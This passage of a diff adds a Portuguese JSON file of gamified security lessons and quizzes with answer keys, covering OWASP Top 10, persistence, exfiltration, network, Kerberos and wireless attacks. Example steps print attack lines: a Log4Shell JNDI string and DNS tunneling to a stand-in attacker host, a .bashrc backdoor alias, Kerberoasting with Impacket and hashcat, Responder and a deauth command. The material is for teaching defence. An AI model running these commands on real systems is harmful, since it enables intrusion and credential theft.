+        "explanation": "Este IP especial roteia o tráfego de dentro da instância para o hypervisor da nuvem para entregar metadados e credenciais temporárias."
+      }
+    ]
+  },
+  {
+    "filename": "6.1a-owasp-top10-1.html",
+    "module": "6",
+    "title": "OWASP Top 10 (Parte 1) 6.1a",
+    "victory_msg": "OWASP PARTE 1 DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-list",
+        "title": "O que é a OWASP?",
+        "content": "A <b>OWASP</b> (Open Web Application Security Project) é uma fundação sem fins lucrativos. O <b>OWASP Top 10</b> é um documento de conscientização que lista os 10 riscos de segurança mais críticos para aplicações web.",
+        "highlight": "OWASP Top 10 = guia de sobrevivência em AppSec"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-key",
+        "title": "A01: Quebra de Controle de Acesso",
+        "content": "Ocorre quando usuários conseguem acessar dados ou executar ações que não deveriam. Exemplos: acessar URL admin sem estar logado, alterar ID na URL para ver conta de outra pessoa (<b>IDOR</b>).",
+        "highlight": "Autorização falha = caos"
+      },
+      {
+        "type": "example",
+        "icon": "fa-user-secret",
+        "title": "IDOR na Prática",
+        "scenario": "O usuário está logado como ID 10. Ele altera a URL para acessar os dados do ID 11.",
+        "code": "URL original: http://alvo.com/perfil?id=10\nAtacante muda para: http://alvo.com/perfil?id=11\n(Se a aplicação não verificar permissão, ele verá dados de outros)",
+        "takeaway": "IDOR (Insecure Direct Object Reference) é uma falha clássica de A01."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-lock",
+        "title": "A02: Falhas Criptográficas",
+        "content": "Falta de criptografia ou uso de algoritmos fracos/antigos (MD5, SHA1). Leva à exposição de dados sensíveis (senhas, cartões). Exemplos: tráfego HTTP em vez de HTTPS, senhas não hasheadas no banco.",
+        "highlight": "MD5 e SHA1 estão obsoletos"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual categoria do OWASP Top 10 inclui a vulnerabilidade IDOR (Insecure Direct Object Reference)?",
+        "options": [
+          "A01: Quebra de Controle de Acesso",
+          "A02: Falhas Criptográficas",
+          "A03: Injeção"
+        ],
+        "correctText": "A01: Quebra de Controle de Acesso",
+        "explanation": "IDOR ocorre quando o sistema não verifica adequadamente se o usuário tem autorização para acessar o recurso solicitado pelo ID."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-syringe",
+        "title": "A03: Injeção",
+        "content": "Dados não confiáveis do usuário são enviados a um interpretador como parte de um comando. O interpretador é 'enganado' e executa comandos não intencionais. Exemplos: <b>SQL Injection</b>, <b>OS Command Injection</b>.",
+        "highlight": "Valide e sanitize todas as entradas"
+      },
+      {
+        "type": "fill",
+        "sentence": "A categoria OWASP que lida com dados sendo enviados como comandos para interpretadores, como em SQLi, é a A03: ___.",
+        "options": [
+          "Injeção",
+          "Design Inseguro",
+          "Desconfiguração"
+        ],
+        "correctText": "Injeção",
+        "explanation": "Injeções ocorrem quando a entrada do usuário altera a sintaxe e a lógica do comando subjacente."
+      }
+    ]
+  },
+  {
+    "filename": "6.1b-owasp-top10-2.html",
+    "module": "6",
+    "title": "OWASP Top 10 (Parte 2) 6.1b",
+    "victory_msg": "OWASP PARTE 2 DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-pen-ruler",
+        "title": "A04: Design Inseguro",
+        "content": "Vulnerabilidades decorrentes de falhas na arquitetura e no modelo de ameaça. Não podem ser corrigidas por código seguro se o <i>design</i> original já é falho (ex: perguntas de recuperação de senha fáceis de adivinhar).",
+        "highlight": "Design inseguro não tem patch de código"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-sliders",
+        "title": "A05: Configuração de Segurança Incorreta",
+        "content": "Sistemas mantidos com configurações padrão, diretórios abertos, mensagens de erro detalhadas (stack traces) expostas, ou serviços desnecessários habilitados.",
+        "highlight": "Remova padrões e feche o que não usa"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-box-open",
+        "title": "A06: Componentes Vulneráveis e Desatualizados",
+        "content": "Usar bibliotecas de terceiros, frameworks ou servidores web que possuem falhas conhecidas (CVEs). A aplicação herda as vulnerabilidades das suas dependências.",
+        "highlight": "A maioria do código nas aplicações web vem de terceiros"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Falha Log4j (Componente Vulnerável)",
+        "scenario": "A biblioteca Java Log4j tinha uma vulnerabilidade RCE crítica (Log4Shell). Milhões de aplicações que usavam Log4j sem atualizar foram comprometidas.",
+        "code": "O atacante envia uma string especial no header User-Agent: \n${jndi:ldap://atacante.com/exploit}",
+        "takeaway": "Mantenha dependências atualizadas sempre!"
+      },
+      {
+        "type": "quiz",
+        "task": "Uma aplicação web que exibe mensagens de erro com stack trace do banco de dados na tela do usuário sofre de qual falha do OWASP Top 10?",
+        "options": [
+          "A05: Configuração de Segurança Incorreta",
+          "A01: Quebra de Controle de Acesso",
+          "A03: Injeção"
+        ],
+        "correctText": "A05: Configuração de Segurança Incorreta",
+        "explanation": "A exposição de erros detalhados ajuda os atacantes a mapear o backend e é uma falha de configuração."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-id-badge",
+        "title": "A07: Falhas de Identificação e Autenticação",
+        "content": "Antigamente 'Broken Authentication'. Envolve falhas no login: permitir senhas fracas, ausência de MFA, não invalidar sessões após o logout, exposição do ID de sessão.",
+        "highlight": "Autenticação falha = roubo de contas"
+      },
+      {
+        "type": "match",
+        "title": "OWASP → Descrição",
+        "pairs": [
+          {
+            "term": "A01 Controle de Acesso",
+            "definition": "Usuário faz o que não deve"
+          },
+          {
+            "term": "A02 Falhas Criptográficas",
+            "definition": "Dados em trânsito/repouso sem proteção"
+          },
+          {
+            "term": "A03 Injeção",
+            "definition": "Input executado como comando"
+          },
+          {
+            "term": "A06 Componentes Vulneráveis",
+            "definition": "Uso de bibliotecas com CVEs conhecidos"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "6.12a-codigo-inseguro-memoria.html",
+    "module": "6",
+    "title": "Falhas de Memória e C (6.12a)",
+    "victory_msg": "CÓDIGO INSEGURO DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-microchip",
+        "title": "Corrupção de Memória",
+        "content": "Linguagens como C/C++ não gerenciam memória automaticamente. Se o programa gravar dados além do limite de um buffer, ocorre um <b>Buffer Overflow</b>. Isso permite a um atacante injetar e executar código malicioso (shellcode) ou derrubar a aplicação (DoS).",
+        "highlight": "Buffer Overflow = sobrescrever memória para ganhar execução de código"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-memory",
+        "title": "Memory Leaks",
+        "content": "Se um programa aloca memória e esquece de liberá-la, ocorre um <b>Memory Leak</b> (Vazamento de Memória). Com o tempo, o programa consome toda a memória do sistema, resultando em <b>Denial of Service (DoS)</b>.",
+        "highlight": "Memory leak = esgotamento de recursos = DoS"
+      },
+      {
+        "type": "quiz",
+        "task": "Uma falha clássica em C/C++ que permite sobrescrever a memória adjacente e possivelmente executar código arbitrário é chamada de:",
+        "options": [
+          "Buffer Overflow",
+          "SQL Injection",
+          "Cross-Site Scripting"
+        ],
+        "correctText": "Buffer Overflow",
+        "explanation": "Buffer overflows exploram a falta de checagem de limites ao escrever dados em variáveis na memória."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-stopwatch",
+        "title": "Race Conditions (TOCTOU)",
+        "content": "Uma <b>Race Condition</b> ocorre quando o resultado do sistema depende da sequência em que processos são executados. <b>TOCTOU</b> (Time of Check to Time of Use) é quando o estado muda entre a verificação de segurança e o uso real.",
+        "highlight": "Condição de corrida = atacar o tempo entre a checagem e a ação"
+      },
+      {
+        "type": "fill",
+        "sentence": "A falha de concorrência onde a segurança é comprometida entre o momento de verificação (Check) e o momento de uso (Use) é chamada de ___.",
+        "options": [
+          "TOCTOU",
+          "XSS",
+          "CSRF"
+        ],
+        "correctText": "TOCTOU",
+        "explanation": "TOCTOU (Time of Check to Time of Use) é um tipo clássico de Race Condition."
+      }
+    ]
+  },
+  {
+    "filename": "6.12b-codigo-inseguro-web.html",
+    "module": "6",
+    "title": "Lógica e Deserialização (6.12b)",
+    "victory_msg": "DESERIALIZATION DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-box-open",
+        "title": "Insecure Deserialization",
+        "content": "Serialização converte objetos em formato salvável/transmissível (JSON, XML, binário). <b>Deserialização</b> reconstrói o objeto. Se a aplicação deserializar dados fornecidos pelo usuário sem validação, o atacante pode instanciar classes maliciosas e obter <b>RCE</b> (Remote Code Execution).",
+        "highlight": "Nunca deserialize dados não confiáveis!"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Deserialização em PHP",
+        "scenario": "A aplicação recebe um cookie serializado do usuário e o deserializa. O atacante forja um objeto malicioso para executar comandos na criação.",
+        "code": "// Código vulnerável\n$user = unserialize($_COOKIE['user_data']);",
+        "takeaway": "Use formatos seguros (JSON) sem instanciar classes ativamente se não for estritamente necessário."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-code-compare",
+        "title": "Tratamento de Erros Inseguro",
+        "content": "Erros devem ser tratados com cuidado. Falhar 'aberto' (fail open) pode ignorar controles de segurança se ocorrer um erro. O correto é <b>fail close</b> (falhar fechado), negando o acesso por padrão em caso de erro. Expor stack traces (A05) também vaza dados.",
+        "highlight": "Em caso de erro, a resposta padrão deve ser 'Acesso Negado'"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual prática de desenvolvimento seguro determina que, em caso de exceção ou erro no sistema, o acesso deve ser negado por padrão?",
+        "options": [
+          "Fail Close",
+          "Fail Open",
+          "Race Condition"
+        ],
+        "correctText": "Fail Close",
+        "explanation": "Fail close (ou fail secure) garante que uma falha não resulte em bypass de segurança."
+      },
+      {
+        "type": "match",
+        "title": "Falha de Código → Descrição",
+        "pairs": [
+          {
+            "term": "Buffer Overflow",
+            "definition": "Sobrescreve a memória adjacente"
+          },
+          {
+            "term": "Insecure Deserialization",
+            "definition": "Reconstrói objetos perigosos a partir de input"
+          },
+          {
+            "term": "Race Condition",
+            "definition": "Explora a concorrência e timing"
+          },
+          {
+            "term": "Memory Leak",
+            "definition": "Esquece de liberar memória, causando DoS"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "8.1a-persistencia-avancada.html",
+    "module": "8",
+    "title": "Persistência Avançada 8.1a",
+    "victory_msg": "PERSISTÊNCIA AVANÇADA DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-anchor",
+        "title": "Persistência no Windows",
+        "content": "Além de scheduled tasks e contas locais, atacantes mantêm acesso via: <b>Registry Run Keys</b> (executa na inicialização), <b>Serviços do Windows</b> (executa como SYSTEM), <b>WMI Event Subscriptions</b> (executa payloads em resposta a eventos do sistema) e <b>Sticky Keys</b> (acesso via login screen).",
+        "highlight": "Persistência = sobreviver a reboots"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-linux",
+        "title": "Persistência no Linux",
+        "content": "No Linux, a persistência é feita via: chaves <b>SSH</b> em ~/.ssh/authorized_keys, <b>Cron jobs</b>, <b>Serviços systemd</b> e arquivos de inicialização do bash (<b>.bashrc</b>, <b>.profile</b>).",
+        "highlight": "Um SSH key garante acesso invisível e permanente"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Backdoor via .bashrc",
+        "scenario": "O atacante adiciona um alias no .bashrc do root. Toda vez que o root digita 'ls', um script malicioso é executado silenciosamente.",
+        "code": "echo \"alias ls='ls --color=auto; /tmp/backdoor.sh'\" >> ~/.bashrc",
+        "takeaway": "Isso permite roubar senhas de sudo quando o admin usa o terminal."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual técnica de persistência do Windows permite que payloads sejam executados em resposta a eventos do sistema operacional, sem arquivos no disco?",
+        "options": [
+          "WMI Event Subscriptions",
+          "Sticky Keys",
+          "Cron jobs"
+        ],
+        "correctText": "WMI Event Subscriptions",
+        "explanation": "WMI (Windows Management Instrumentation) permite disparar scripts quando certos eventos (ex: login de usuário) ocorrem."
+      },
+      {
+        "type": "fill",
+        "sentence": "A técnica de persistência que explora ferramentas de acessibilidade do Windows na tela de login é chamada de ___.",
+        "options": [
+          "Sticky Keys",
+          "Run Keys",
+          "WMI"
+        ],
+        "correctText": "Sticky Keys",
+        "explanation": "O ataque Sticky Keys substitui o utilitário sethc.exe (acionado por Shift 5 vezes) por cmd.exe na tela de login."
+      }
+    ]
+  },
+  {
+    "filename": "8.2a-lateral-exfiltracao.html",
+    "module": "8",
+    "title": "Mov. Lateral e Exfiltração 8.2a",
+    "victory_msg": "MOVIMENTO LATERAL E EXFILTRAÇÃO DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-arrows-left-right",
+        "title": "Movimento Lateral: Execução",
+        "content": "Após obter um hash (Pass-the-Hash) ou ticket (Pass-the-Ticket), o atacante precisa executar comandos remotamente. Ferramentas: <b>PsExec</b> (via SMB), <b>WMIExec</b>, <b>WinRM</b> (Powershell Remoting).",
+        "highlight": "Mover-se = autenticar e executar código noutro host"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-upload",
+        "title": "Exfiltração de Dados",
+        "content": "O objetivo final muitas vezes é roubar dados (Exfiltração). Para não ser pego pelo firewall/DLP, o atacante usa canais encobertos: <b>DNS Tunneling</b>, ICMP, HTTPS, ou esteganografia.",
+        "highlight": "Exfiltração = tirar o prêmio de dentro da rede"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "DNS Tunneling",
+        "scenario": "O atacante encoda dados em base64 e os envia como subdomínios em requisições DNS para o servidor do atacante.",
+        "code": "# Vítima tenta resolver:\ndados-secretos-base64.atacante.com\n\n# O servidor DNS do atacante recebe e decoda os dados",
+        "takeaway": "O tráfego DNS raramente é bloqueado ou inspecionado a fundo por firewalls corporativos."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-user-ninja",
+        "title": "Cobalt Strike e C2",
+        "content": "Atores avançados (APTs e Ransomware) usam <b>Cobalt Strike</b> para movimentação lateral e evasão. Ele possui <b>Malleable C2</b>, que permite alterar a assinatura do tráfego para parecer com navegação web normal (Amazon, Gmail) e enganar o IDS/IPS.",
+        "highlight": "Cobalt Strike = padrão ouro do malware avançado"
+      },
+      {
+        "type": "match",
+        "title": "Fase Pós-Exploração → Ferramenta/Técnica",
+        "pairs": [
+          {
+            "term": "Execução Remota",
+            "definition": "PsExec, WMIExec"
+          },
+          {
+            "term": "Evasão de IDS/IPS",
+            "definition": "Malleable C2, Obfuscation"
+          },
+          {
+            "term": "Persistência (Win)",
+            "definition": "Registry Run Keys, WMI"
+          },
+          {
+            "term": "Exfiltração",
+            "definition": "DNS Tunneling"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta/tecnologia é usada em ataques de exfiltração para esconder dados enviados para fora da rede, passando por firewalls restritivos?",
+        "options": [
+          "DNS Tunneling",
+          "Nmap",
+          "Enum4linux"
+        ],
+        "correctText": "DNS Tunneling",
+        "explanation": "DNS Tunneling usa requisições de resolução de nomes comuns para extrair ou receber dados sorrateiramente."
+      }
+    ]
+  },
+  {
+    "filename": "5.1a-protocolos-ataques.html",
+    "module": "5",
+    "title": "Protocolos e Ataques de Rede 5.1a",
+    "victory_msg": "PROTOCOLOS DE REDE DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-route",
+        "title": "ARP Spoofing",
+        "content": "<b>ARP Spoofing</b> envia respostas ARP falsas para associar o MAC do atacante ao IP do gateway. Todo o tráfego da vítima passa pelo atacante (<b>Man-in-the-Middle</b>).",
+        "highlight": "ARP Spoofing = redirecionar tráfego para si"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "Man-in-the-Middle (MITM)",
+        "content": "No <b>MITM</b>, o atacante intercepta a comunicação entre duas partes. Pode <b>ler</b>, <b>modificar</b> e <b>injetar</b> dados. Ferramentas: <b>Ettercap</b>, <b>Bettercap</b>, <b>mitmproxy</b>.",
+        "highlight": "MITM = interceptação + manipulação em tempo real"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-server",
+        "title": "LLMNR/NBT-NS Poisoning",
+        "content": "<b>LLMNR</b> e <b>NBT-NS</b> são protocolos Windows de resolução de nomes local. O atacante responde a essas queries para capturar <b>hashes NTLMv2</b> de credenciais. Ferramenta: <b>Responder</b>.",
+        "highlight": "Responder captura hashes automaticamente na rede"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Responder em Ação",
+        "scenario": "O pentester roda Responder na rede e captura hashes NTLMv2 quando usuários Windows tentam acessar shares inexistentes.",
+        "code": "responder -I eth0 -wrf",
+        "takeaway": "LLMNR poisoning é um dos ataques mais eficazes em redes Windows."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta captura hashes NTLMv2 respondendo a queries LLMNR/NBT-NS?",
+        "options": [
+          "Responder",
+          "Nmap",
+          "Wireshark"
+        ],
+        "correctText": "Responder",
+        "explanation": "Responder se anuncia como servidor para queries de resolução de nome e captura credenciais."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-arrow-right-arrow-left",
+        "title": "NTLM Relay",
+        "content": "Após capturar um hash NTLM, o atacante pode <b>retransmiti-lo</b> (relay) para outro serviço, autenticando sem crackar a senha. Ferramenta: <b>ntlmrelayx</b> (Impacket).",
+        "highlight": "Relay = usar o hash imediatamente sem crackar"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-network-wired",
+        "title": "VLAN Hopping",
+        "content": "<b>VLAN Hopping</b> permite ao atacante saltar entre VLANs. Técnicas: <b>Switch Spoofing</b> (fingir ser um switch trunk) e <b>Double Tagging</b> (encapsular 2 tags 802.1Q).",
+        "highlight": "VLANs não são barreira de segurança real"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-globe",
+        "title": "DNS Poisoning",
+        "content": "<b>DNS Poisoning/Spoofing</b> altera respostas DNS para redirecionar vítimas a sites falsos. O atacante injeta registros DNS falsos no cache do resolver.",
+        "highlight": "DNS envenenado = site legítimo vira armadilha"
+      },
+      {
+        "type": "fill",
+        "sentence": "O ataque que retransmite hashes NTLM capturados para autenticar em outros serviços é o ___.",
+        "options": [
+          "NTLM Relay",
+          "Brute Force",
+          "Phishing"
+        ],
+        "correctText": "NTLM Relay",
+        "explanation": "NTLM Relay usa o hash capturado imediatamente, sem precisar crackear."
+      },
+      {
+        "type": "match",
+        "title": "Ataque de Rede → Técnica",
+        "pairs": [
+          {
+            "term": "ARP Spoofing",
+            "definition": "Redireciona tráfego via ARP falso"
+          },
+          {
+            "term": "LLMNR Poisoning",
+            "definition": "Captura hashes via resolução local"
+          },
+          {
+            "term": "VLAN Hopping",
+            "definition": "Salta entre VLANs isoladas"
+          },
+          {
+            "term": "DNS Poisoning",
+            "definition": "Redireciona via DNS falso"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "5.1b-senhas-kerberos.html",
+    "module": "5",
+    "title": "Ataques de Senha e Kerberos 5.1b",
+    "victory_msg": "ATAQUES DE SENHA DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-key",
+        "title": "Brute Force e Dictionary",
+        "content": "<b>Brute Force</b>: testa TODAS as combinações. <b>Dictionary</b>: testa palavras de uma lista. <b>Hybrid</b>: combina dicionário + regras (ex: Password1!, Password2!).",
+        "highlight": "Dicionário é mais rápido, brute force é mais completo"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-unlock",
+        "title": "Pass-the-Hash",
+        "content": "No <b>Pass-the-Hash</b>, o atacante usa o hash NTLM capturado para autenticar em serviços Windows <b>sem precisar da senha em texto claro</b>. Funciona com <b>psexec</b> e <b>wmiexec</b>.",
+        "highlight": "Hash NTLM = equivalente à senha no Windows"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-ticket",
+        "title": "Kerberoasting",
+        "content": "<b>Kerberoasting</b>: solicita tickets Kerberos TGS para contas de serviço e tenta crackar offline. Contas de serviço frequentemente têm senhas fracas e privilégios altos.",
+        "highlight": "Service accounts = alvo fácil com alto impacto"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Kerberoasting com Impacket",
+        "scenario": "O pentester solicita tickets TGS para todas as contas de serviço do AD e tenta crackar com Hashcat.",
+        "code": "GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -outputfile tgs.txt\nhashcat -m 13100 tgs.txt rockyou.txt",
+        "takeaway": "Kerberoasting não requer privilégios elevados no AD."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-id-card",
+        "title": "AS-REP Roasting",
+        "content": "<b>AS-REP Roasting</b>: explora contas com <b>Kerberos pre-auth desabilitado</b>. O atacante solicita o AS-REP e cracka offline sem precisar de credenciais válidas.",
+        "highlight": "Pre-auth desabilitado = senha crackável sem login"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-database",
+        "title": "Credential Stuffing",
+        "content": "<b>Credential Stuffing</b>: usa pares <b>email:senha</b> de vazamentos (breaches) para tentar login em outros serviços. 65% das pessoas reutilizam senhas.",
+        "highlight": "Reutilização de senhas = porta aberta"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ataque solicita tickets Kerberos TGS para crackar senhas de service accounts offline?",
+        "options": [
+          "Kerberoasting",
+          "Phishing",
+          "ARP Spoofing"
+        ],
+        "correctText": "Kerberoasting",
+        "explanation": "Kerberoasting explora contas de serviço com SPNs registrados no Active Directory."
+      },
+      {
+        "type": "match",
+        "title": "Ataque → Requisito",
+        "pairs": [
+          {
+            "term": "Pass-the-Hash",
+            "definition": "Hash NTLM capturado"
+          },
+          {
+            "term": "Kerberoasting",
+            "definition": "Acesso ao AD (qualquer user)"
+          },
+          {
+            "term": "AS-REP Roasting",
+            "definition": "Pre-auth desabilitado"
+          },
+          {
+            "term": "Credential Stuffing",
+            "definition": "Lista de credenciais vazadas"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "O ataque que explora contas com Kerberos pre-authentication desabilitado é o ___.",
+        "options": [
+          "AS-REP Roasting",
+          "Kerberoasting",
+          "Pass-the-Hash"
+        ],
+        "correctText": "AS-REP Roasting",
+        "explanation": "AS-REP Roasting funciona sem credenciais se a pre-auth estiver desabilitada."
+      }
+    ]
+  },
+  {
+    "filename": "5.2a-wireless-fundamentals.html",
+    "module": "5",
+    "title": "Fundamentos Wireless 5.2a",
+    "victory_msg": "WIRELESS FUNDAMENTALS DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-wifi",
+        "title": "Protocolos WiFi",
+        "content": "<b>WEP</b>: RC4, quebrado (não usar). <b>WPA</b>: TKIP, vulnerável. <b>WPA2-Personal</b>: PSK + AES/CCMP, padrão atual. <b>WPA2-Enterprise</b>: 802.1X + RADIUS. <b>WPA3</b>: SAE, mais seguro.",
+        "highlight": "WEP→WPA→WPA2→WPA3: evolução da segurança"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "WPA2-Enterprise vs Personal",
+        "content": "<b>Personal (PSK)</b>: senha compartilhada por todos. <b>Enterprise (802.1X)</b>: cada usuário tem credenciais individuais autenticadas por RADIUS. Enterprise é mais seguro.",
+        "highlight": "Enterprise = autenticação individual por usuário"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual modo WPA2 usa autenticação individual via servidor RADIUS?",
+        "options": [
+          "WPA2-Enterprise",
+          "WPA2-Personal",
+          "WEP"
+        ],
+        "correctText": "WPA2-Enterprise",
+        "explanation": "WPA2-Enterprise usa 802.1X com RADIUS para autenticar cada usuário individualmente."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-satellite-dish",
+        "title": "Captura de Handshake",
+        "content": "O <b>4-way handshake</b> do WPA2 pode ser capturado com <b>airodump-ng</b>. Para forçar a captura, usa-se <b>deautenticação</b> para desconectar clientes e forçar reconexão.",
+        "highlight": "Deauth → captura handshake → brute force offline"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-bolt",
+        "title": "PMKID Attack",
+        "content": "O ataque <b>PMKID</b> captura o hash diretamente do AP, <b>sem precisar de clientes conectados</b>. É mais rápido que esperar o handshake. Ferramenta: <b>hcxdumptool</b>.",
+        "highlight": "PMKID = ataque ao AP sem depender de clientes"
+      },
+      {
+        "type": "fill",
+        "sentence": "O ataque ___ captura o hash WiFi direto do AP sem precisar de clientes conectados.",
+        "options": [
+          "PMKID",
+          "Evil Twin",
+          "Deauth"
+        ],
+        "correctText": "PMKID",
+        "explanation": "PMKID extrai o hash do primeiro frame EAPOL, sem necessidade de capturar o handshake completo."
+      }
+    ]
+  },
+  {
+    "filename": "5.2b-wireless-attacks.html",
+    "module": "5",
+    "title": "Ataques Wireless Avançados 5.2b",
+    "victory_msg": "WIRELESS ATTACKS DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-tower-broadcast",
+        "title": "Evil Twin",
+        "content": "<b>Evil Twin</b>: AP falso com SSID idêntico ao legítimo. Combinado com <b>deauth</b>, força vítimas a conectar no AP falso. Ferramentas: <b>hostapd-wpe</b>, <b>Fluxion</b>.",
+        "highlight": "AP falso + deauth = interceptação total"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-ghost",
+        "title": "Karma Attack",
+        "content": "<b>Karma</b>: o AP falso responde a <b>TODAS</b> as probe requests, fingindo ser qualquer rede que o dispositivo já conhece. O celular da vítima conecta automaticamente.",
+        "highlight": "Karma = 'eu sou a rede que você procura'"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-ban",
+        "title": "Deauthentication Attack",
+        "content": "Frames de <b>deautenticação 802.11</b> não são autenticados. O atacante envia deauth frames para desconectar clientes, forçando reconexão ao Evil Twin ou captura de handshake.",
+        "highlight": "Deauth é irrastreável e não requer autenticação"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Deauth com Aireplay-ng",
+        "scenario": "O pentester envia 100 frames de deautenticação para desconectar o cliente alvo do AP legítimo.",
+        "code": "aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon",
+        "takeaway": "Deauth é o catalisador de vários ataques WiFi."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ataque faz o AP falso responder a QUALQUER probe request, fingindo ser qualquer rede?",
+        "options": [
+          "Karma",
+          "Evil Twin",
+          "WEP Cracking"
+        ],
+        "correctText": "Karma",
+        "explanation": "Karma responde 'sim, sou eu' para toda probe request que o dispositivo envia."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "Rogue AP Detection",
+        "content": "Para detectar APs falsos: <b>WIPS</b> (Wireless Intrusion Prevention), <b>802.11w</b> (Protected Management Frames) contra deauth, e <b>NAC</b> (Network Access Control).",
+        "highlight": "802.11w impede deauth forjado"
+      },
+      {
+        "type": "match",
+        "title": "Ataque WiFi → Descrição",
+        "pairs": [
+          {
+            "term": "Evil Twin",
+            "definition": "AP falso com mesmo SSID"
+          },
+          {
+            "term": "Karma",
+            "definition": "AP que finge ser qualquer rede"
+          },
+          {
+            "term": "PMKID",
+            "definition": "Hash direto do AP sem clientes"
+          },
+          {
+            "term": "Deauth",
+            "definition": "Desconecta clientes forçadamente"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "O padrão ___ protege frames de gerenciamento 802.11 contra ataques de deautenticação.",
+        "options": [
+          "802.11w",
+          "802.11ac",
+          "802.11n"
+        ],
+        "correctText": "802.11w",
+        "explanation": "802.11w (PMF) autentica frames de gerenciamento, impedindo deauth forjado."
+      }
+    ]
+  },
+  {
+    "filename": "7.2a-mobile-iot.html",
+    "module": "7",
+    "title": "Mobile e IoT 7.2a",
+    "victory_msg": "MOBILE & IOT DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-mobile-screen",
+        "title": "Atacando Dispositivos Móveis",
+        "content": "Dispositivos móveis são alvos via <b>apps maliciosos</b>, <b>MDM bypass</b>, <b>jailbreak/root</b> e <b>interceptação de tráfego</b>. Ferramentas: <b>Frida</b>, <b>Objection</b>, <b>MobSF</b>.",
+        "highlight": "Celulares são computadores vulneráveis no bolso"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-mobile-retro",
+        "title": "Vulnerabilidades Móveis",
+        "content": "Principais riscos: <b>armazenamento inseguro</b> de dados no dispositivo, <b>comunicação sem TLS</b>, <b>autenticação fraca</b>, <b>binary protections</b> ausentes e <b>side-loading</b> de APKs.",
+        "highlight": "OWASP Mobile Top 10 lista os riscos"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta é usada para análise dinâmica de apps móveis via hooking?",
+        "options": [
+          "Frida",
+          "Nmap",
+          "Aircrack-ng"
+        ],
+        "correctText": "Frida",
+        "explanation": "Frida injeta scripts em apps mobile em tempo real para análise dinâmica e bypass de proteções (ex: SSL Pinning)."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-microchip",
+        "title": "Atacando IoT",
+        "content": "Dispositivos IoT têm superfície de ataque ampla: <b>firmware inseguro</b>, <b>credenciais default</b>, <b>protocolos sem criptografia</b> (MQTT, CoAP), <b>interfaces expostas</b> (UART, JTAG).",
+        "highlight": "IoT = muitos dispositivos, pouca segurança"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-tower-broadcast",
+        "title": "Protocolos IoT",
+        "content": "<b>MQTT</b>: protocolo pub/sub leve, frequentemente sem autenticação. <b>CoAP</b>: versão IoT do HTTP. <b>Zigbee/Z-Wave</b>: redes de curto alcance doméstico. <b>LoRaWAN</b>: longo alcance, baixo consumo.",
+        "highlight": "Protocolos IoT priorizam eficiência sobre segurança"
+      },
+      {
+        "type": "match",
+        "title": "Protocolo IoT → Descrição",
+        "pairs": [
+          {
+            "term": "MQTT",
